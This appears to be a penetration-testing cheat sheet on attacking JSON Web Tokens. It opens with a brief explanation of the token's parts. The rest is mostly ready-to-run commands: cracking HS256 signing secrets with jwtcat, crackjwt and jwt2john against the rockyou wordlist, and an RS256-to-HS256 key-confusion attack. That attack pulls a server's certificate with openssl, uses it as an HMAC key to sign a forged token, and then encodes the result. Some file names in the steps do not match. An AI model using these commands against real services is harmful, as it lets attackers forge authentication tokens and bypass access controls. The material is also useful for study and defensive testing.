
# JSON Web authentication


JSON Web Tokens used by most modern web applications instead of using session base cookies claims between two Endpoint to protect the integrity of the underlying message using a Message Authentication Code (MAC) encrypted. A JSON Web Token consists of three parts; an encoded Header, an encoded Payload and the Signature.


* The Header contains metadata, defines the type of token and the algorithm used for encryption of Payload.
* The Payload contains the claims to routes and services in value key pairs. 
* The signature is calculated by encrypting the base64UrlEncoded values of Header and Payload using a secret Key





### HMAC Secret Key Brute-forcing 

The algorithm HS256 uses a secret key to sign and verify each message. The algorithm RS256 uses a private key to sign messages, and a public key to verify them and uses the public key for authentication.

```
python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.J8SS8VKlI2yV47C4BtfYukWPx_2welF34Mz7l-MNmkE -w /usr/share/wordlists/rockyou.txt

python3 jwtcat.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 -w /usr/share/wordlists/rockyou.txt

python crackjwt.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4 /usr/share/wordlists/rockyou.txt

python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4  > jwt.john

```

# JSON Public Keys
The algorithm HS256 uses a secret key to sign and verify each message. The algorithm RS256 uses a private key to sign messages,
**To obtain the Public Key using openssl client**
```
TARGET_HOST="demo.resilient.ninja"
TARGET_PORT="443"
openssl s_client -showcerts -connect $TARGET_HOST:$TARGET_PORT </dev/null 2>/dev/null|openssl x509 -outform PEM > $TARGET_HOST.pem
openssl x509 -in cert.pem -pubkey –noout > key.pem
cat resilient.pem | xxd -p | tr -d "\\n" # Turning into ASCII hex Format

```
To obtain The  HMAC signature is used in the application.
```
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU0NzcyOTY2MiwiZXhwIjoxNTQ3Nzk5OTk5LCJkYXRhIjp7Ik5DQyI6InRlc3QifX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0a4d49494a566a43434344366741774942416749514171475a77597151525a7743414141414148504d6244414e42676b71686b69473977304241517346414442430a4d517377435159445651514745774a56557a45654d4277474131554543684d56523239765a32786c4946527964584e3049464e6c636e5a705932567a4d524d770a45515944565151444577704856464d67513045674d5538784d423458445449774d4463784e5441344d6a6b784e6c6f58445449774d5441774e7a41344d6a6b780a4e6c6f775a6a454c4d416b474131554542684d4356564d78457a415242674e5642416754436b4e6862476c6d62334a7561574578466a415542674e56424163540a445531766457353059576c7549465a705a586378457a415242674e5642416f54436b6476623264735a53424d54454d784654415442674e5642414d4d44436f750a5a3239765a32786c4c6d4e766254425a4d424d4742797147534d34394167454743437147534d34394177454841304941424f4b424d4b2b7949617a41446b32490a7939345a6e39496c437536526566637572715466556559777a7569486e76452f394550517257694e47462b586777424b6b3352535775484b6f694f2f643543710a732f745668382b6a676762744d4949473654414f42674e56485138424166384542414d4342344177457759445652306c42417777436759494b775942425155480a4177457744415944565230544151482f424149774144416442674e56485134454667515552652f416743325164474838374358586953382f69323158447577770a487759445652306a42426777466f41556d4e4834626844727a357673594a38596b4275673633304a2f537377614159494b7759424251554841514545584442610a4d4373474343734741515546427a41426868396f644852774f69387662324e7a6343357761326b755a3239765a79396e64484d78627a466a62334a6c4d4373470a4343734741515546427a41436868396f644852774f693876634774704c6d6476623263765a334e794d69394856464d78547a457559334a304d494945714159440a56523052424949456e7a4343424a754344436f755a3239765a32786c4c6d4e766259494e4b693568626d527962326c6b4c6d4e76625949574b6935686348426c0a626d6470626d55755a3239765a32786c4c6d4e766259494a4b6935695a4734755a475632676849714c6d4e736233566b4c6d6476623264735a53356a623232430a47436f7559334a766432527a62335679593255755a3239765a32786c4c6d4e76625949474b69356e4c6d4e76676734714c6d646a6343356e646e51794c6d4e760a625949524b69356e5933426a5a4734755a335a304d53356a6232324343696f755a326477614851755932364344696f755a32746c593235686348427a4c6d4e750a676859714c6d6476623264735a533168626d46736558527059334d7559323974676773714c6d6476623264735a53356a5959494c4b69356e6232396e624755750a5932794344696f755a3239765a32786c4c6d4e764c6d6c75676734714c6d6476623264735a53356a627935716349494f4b69356e6232396e62475575593238750a6457754344796f755a3239765a32786c4c6d4e7662533568636f49504b69356e6232396e62475575593239744c6d4631676738714c6d6476623264735a53356a0a62323075596e4b4344796f755a3239765a32786c4c6d4e766253356a623449504b69356e6232396e62475575593239744c6d3134676738714c6d6476623264730a5a53356a6232307564484b4344796f755a3239765a32786c4c6d4e7662533532626f494c4b69356e6232396e624755755a47574343796f755a3239765a32786c0a4c6d567a676773714c6d6476623264735a53356d636f494c4b69356e6232396e624755756148574343796f755a3239765a32786c4c6d6c30676773714c6d64760a623264735a5335756249494c4b69356e6232396e624755756347794343796f755a3239765a32786c4c6e4230676849714c6d6476623264735a57466b595842700a6379356a6232324344796f755a3239765a32786c595842706379356a626f49524b69356e6232396e6247566a626d467763484d755932364346436f755a3239760a5a32786c59323974625756795932557559323974676845714c6d6476623264735a585a705a4756764c6d4e766259494d4b69356e6333526864476c6a4c6d4e750a676730714c6d647a6447463061574d7559323974676849714c6d647a6447463061574e6a626d467763484d755932364343696f755a335a304d53356a623232430a43696f755a335a304d69356a6232324346436f7562575630636d6c6a4c6d647a6447463061574d7559323974676777714c6e5679593268706269356a623232430a45436f7564584a734c6d6476623264735a53356a6232324345796f75643256686369356e6132566a626d467763484d755932364346696f7565573931644856690a5a53317562324e76623274705a53356a6232324344536f7565573931644856695a53356a6232324346696f7565573931644856695a57566b64574e6864476c760a6269356a6232324345536f7565573931644856695a5774705a484d7559323974676763714c6e6c304c6d4a6c676773714c6e6c306157316e4c6d4e76625949610a5957356b636d39705a43356a62476c6c626e527a4c6d6476623264735a53356a62323243433246755a484a7661575175593239746768746b5a585a6c624739770a5a5849755957356b636d39705a43356e6232396e62475575593236434847526c646d56736233426c636e4d755957356b636d39705a43356e6232396e624755750a593236434247637559322b434347646e634768304c6d4e756767786e6132566a626d467763484d7559323643426d64766279356e624949555a3239765a32786c0a4c5746755957783564476c6a6379356a62323243436d6476623264735a53356a6232324344326476623264735a574e75595842776379356a626f49535a3239760a5a32786c593239746257567959325575593239746768687a62335679593255755957356b636d39705a43356e6232396e6247557559323643436e5679593268700a6269356a62323243436e64336479356e623238755a32794343486c76645852314c6d4a6c676774356233563064574a6c4c6d4e766259495565573931644856690a5a57566b64574e6864476c766269356a6232324344336c7664585231596d56726157527a4c6d4e766259494665585175596d5577495159445652306742426f770a4744414942675a6e67517742416749774441594b4b7759424241485765514946417a417a42674e56485238454c4441714d4369674a71416b68694a6f644852770a4f69387659334a734c6e42726153356e6232396e4c306455557a46504d574e76636d557559334a734d4949424241594b4b7759424241485765514945416753420a39515342386744774148634135784c797344642b476d4c376a736b4d59595478366e73337931596445535a62382b447a532f4a42564734414141467a556336680a5177414142414d4153444247416945416c735575324e7072545475722f4b5839306664594e2f3352702b5575755a496135554a38777a715255626f43495144670a4b32674c396a2f5863374b417766454d4e64346c764775676c4350344258675a74413658434b6e6230674231414165335842766c66576a2f3862444748534d560a7837726d563378586c4c6471377278684f68707030364963414141426331484f6f7a674141415144414559775241496751535348324f3761484e5753335056510a2f5231726b6b414832523336487844464964496b736f566543506f4349464b48596371786f6a6d7556746e2f68424a5a2b4271414f632f586a6775305961754b0a5357555a517864444d41304743537147534962334451454243775541413449424151444c4d68766b4d495349304f2b786d6a44426b636f62707a774d725135740a746634432f3136526e4b64556a3542717a727443426938464b466170664254756d4d477066615a416472687a726974534b75747555414462704f413846586c450a7a5947736b4b6866544d446c314d38356343566b454b51497962346962324e384e6b586d78726363596535524154674d69337a4d5747544e31584135685270700a65356f66522f32652b72665942793937342f6870765a684a704b6a6950584a79726930702f68306d3549674e4a664a53596657617339354f674b4b52585949570a3758396b713778752b706d6b7262474d5674463465586742724c37324e455163306668304c356d415578496e61716a676f614142664e696a533356374d506c670a4d503643756233324b47613575594755427642346c384238387a46485473415542766d6772384c67465451476750503667584b6a327953620a2d2d2d2d2d454e442043455254494649434154452d2d2d2d2d0a
```
 **Upon Obtaining HMAC Signature, Final Step is to be turning into WT format**  now have a header and payload ready to go:
 ```
python -c "exec(\"import base64, binascii\nprint    base64.urlsafe_b64encode(binascii.a2b_hex('7bf0e1b253416f2f0fbf69a31928ca657b14807ad7299a00a36bba46380c95b2')).replace('=','')\")"
```
 